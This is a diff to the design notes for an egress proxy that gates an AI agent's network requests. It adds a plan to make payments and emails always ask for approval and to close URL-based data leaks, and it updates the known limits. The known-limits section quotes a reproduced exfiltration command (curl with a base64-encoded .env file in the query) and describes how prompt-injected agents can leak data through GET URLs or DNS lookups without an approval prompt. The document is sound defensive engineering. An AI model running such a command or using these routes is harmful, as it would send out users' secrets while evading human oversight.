@@ -730,6 +730,31 @@ Not sorted into the 10 days.
 | Model call key check | Model endpoints go free only with the run's own secret placeholder, else `x` (section 10). |
 | Letter accuracy (rwxmap with rwxlite) | Replaces "letter by method" for APIs with a spec: POST reads and AWS-style `?Action=` GETs (rwxlite, Nov 3: label recipe 98.5% on GETs, 93% on POSTs; model not yet evaluated; TF-IDF baseline about 1.5 ms per call). Spec-only: no help for hosts without a spec or body-dependent RPC (GraphQL, JSON-RPC). Does not close the leaks. |
 
+### Next: post-hackathon feedback (decided Nov 5)
+
+Two pieces of public feedback on the release (Nov 4-5, recorded in `docs/logs/findings.md`, "Post-hackathon feedback") set the order of work after the hackathon. **(a) Strengthen the floor:** "forcing payments and emails to always prompt for confirmation is a must-have safety feature", so pay and send ask in every mode. **(b) Fix the read channel:** for an agent the risky bucket is often `r`, not `x`; a prompt injection can turn a GET into exfiltration. (a) goes first because it extends a mechanism that exists (marks); (b) needs proxy work.
+
+**(a) Pay and send always ask (the floor).** Today the floor is a card number in a body of 64 KB or less, or one of four payment path fragments. An email is `x`: it asks in `ask` and `auto` and goes out free in `trust` (Demo A's email was held only because the run was in `auto`).
+
+| # | Item | Spec |
+|---|---|---|
+| a1 | Send floor | A `sendLike` mark asks in every mode, `trust` included, for requests to known email and messaging send endpoints, matched by host and path from a short built-in list (for example SendGrid `/v3/mail/send`, Mailgun `/messages`, Postmark `/email`, Amazon SES `SendEmail`, Resend `/emails`, Gmail `users.messages.send`, Slack `chat.postMessage` and `hooks.slack.com`, Discord webhooks, Twilio `Messages`). Extendable from the one config file. A mark only adds an ask, so no bareguard change. SMTP and other non-HTTP traffic stay denied. Sizing first: list the endpoints the demos and a real Claude Code run actually hit, so the list is not a guess. |
+| a2 | Payment domains | The same mark mechanism for known payment API hosts (Stripe, PayPal, Adyen, Square and similar), on any path. Closes "Payment domains are not built" (section 10). |
+| a3 | Exact effect in the question | For a floor ask, the question names the recipient, amount and currency read from the request body (`to`, `amount`, `currency` and the vendor's equivalents), not from anything the agent says. Today it shows method, URL and a masked 4 KB preview. |
+| a4 | Proof | Tests: each mark asks in `trust`, shown red against today's code. Demo A and Demo B gain a cell: the email asks in `trust`. |
+
+**(b) Fix the read channel.** In order, because each depends on the one before:
+
+| # | Item | Spec |
+|---|---|---|
+| b1 | DNS after the gate | Resolve only after the gate decides; for CONNECT, after the first request in the tunnel is decided (section 10). Without it, b3 still leaks a hostname before the ask. |
+| b2 | URL data check | The parked spec above ("URL data check"): a long query or path, or a long base64/hex run, asks in every mode. Thresholds sized from real traffic first. |
+| b3 | First-contact host ask | The parked spec above: the first request to a host new in this run asks, an allowlist built as you go. |
+| b4 | Egress allowlist (optional) | A config key, `egress.allow: ["host", "*.domain"]`: with it set, a host not on the list is denied before DNS in every mode. Off by default, so the one-command start stays. The feedback's point: an allowlist does more against exfiltration than approving each action. |
+| b5 | Say what is not covered | README Known limits gains one plain sentence: until b1-b3 land, injected instructions that only read and send data out through URLs are not covered in any mode. Docs only; can ship before the code. |
+
+Also noted from the feedback, not scheduled: scope a secret per tool (rwxmap operation), not only per host; every swap is already logged (`verdict: "secret"`, no value).
+
 **Go verdict, verbatim:**
 
 > Verdict: Node, with no real contest. Go wins on memory and shipping. Node wins on reuse, and that reuse turns out to be large. Go could come back later as a rewrite of just the proxy, if measurements ever show memory is the bottleneck.
@@ -741,10 +766,10 @@ Not sorted into the 10 days.
 - **Held requests can time out on the server side.** Holding happens before forwarding, so only the agent's client waits.
 - **Card numbers in bodies over 64 KB are not checked.** Such bodies stream through with the normal letter and mode decision. Checking and denying them would break large uploads, because random 16-digit ids pass Luhn about 1 time in 10.
 - **API keys or passwords inside a body still appear in the 4 KB preview** (ask file only; the audit file holds no preview). Card numbers are masked. bareguard's redaction covers common token shapes once it lands. barebox builds no scrubber of its own.
-- **Payment domains are not built.** Only the four path fragments (`/checkout`, `/payment`, `/orders`, `/purchase`) ask as the payment floor; a request to a known payment domain on any other path is decided by its letter and the mode.
+- **Payment domains are not built** (fix: section 9, "Next", a2). Only the four path fragments (`/checkout`, `/payment`, `/orders`, `/purchase`) ask as the payment floor; a request to a known payment domain on any other path is decided by its letter and the mode.
 - **Held bodies add up on disk.** Each agent has one parked body of up to 50 MB (`heldBodyMaxMB`) in `<runtime>/held`, so 40 agents can hold 2 GB; the runtime defaults to a temp dir, which is often a RAM-backed tmpfs. There is no total cap, and the 145-175 MB budget (superseded Nov 2: about 205-245 MB over HTTPS, see M6) does not count it.
 - **Certificate pinning breaks inspection.** Out of scope.
-- **Data in a GET leaves free in every mode (found Nov 3, reproduced).** `r` (GET/HEAD) is free by design, but the URL carries data to any host that resolves: in `ask` mode, `curl "https://httpbin.org/anything/pixel.gif?d=$(base64 .env)"` delivered the file with 0 asks. Demo B's attacker host is `attacker.invalid`, refused only as unresolvable, so it never covered this. Nothing tried yet. Options: ask on first contact with a new host per run; treat a large or high-entropy query as `x`; a free-read host list with the rest asking in `ask`. **Decided Nov 3 (user): known limit for the hackathon release; the fix is parked, specced with sizing in section 9 (URL data check, then first-contact host ask).** The first-contact option needs the DNS fix below, or a hostname still leaks before the ask.
+- **Data in a GET leaves free in every mode (found Nov 3, reproduced).** `r` (GET/HEAD) is free by design, but the URL carries data to any host that resolves: in `ask` mode, `curl "https://httpbin.org/anything/pixel.gif?d=$(base64 .env)"` delivered the file with 0 asks. Demo B's attacker host is `attacker.invalid`, refused only as unresolvable, so it never covered this. Nothing tried yet. Options: ask on first contact with a new host per run; treat a large or high-entropy query as `x`; a free-read host list with the rest asking in `ask`. **Decided Nov 3 (user): known limit for the hackathon release; the fix is parked, specced with sizing in section 9 (URL data check, then first-contact host ask).** **Nov 5 (user): next after the floor work; order in section 9, "Next", (b).** The first-contact option needs the DNS fix below, or a hostname still leaks before the ask.
 - **DNS resolves before the gate (found Nov 3, code-verified, not observed on the wire).** `checkUpstream` resolves the hostname on arrival (`src/proxy.js:666` for plain HTTP, `:943` at CONNECT), before the gate decides, so data encoded in a hostname reaches the attacker's name server even when the request is then held or denied, in every mode. Nothing tried yet. Fix: decide first, resolve after; for CONNECT, resolve when the first request in the tunnel is decided. **Decided Nov 3 (user): known limit for the hackathon release; the fix is planned after it.**
 - **Model endpoints are an open channel.** Built-in model endpoints and a model API labelled `r` go out free in every mode with any key, an attacker's included. Ledger since Nov 2. Fix idea: free only when the call carries the run's own secret placeholder, else `x`.
 - **A model API labelled `r` is still card-scanned** (found Nov 3). Only the built-in endpoints and `localLlm` skip the card floor (`modelTools`). With a card number anywhere in the conversation, every later call to a labelled model API (Baseten in Demo A) is held. README corrected.
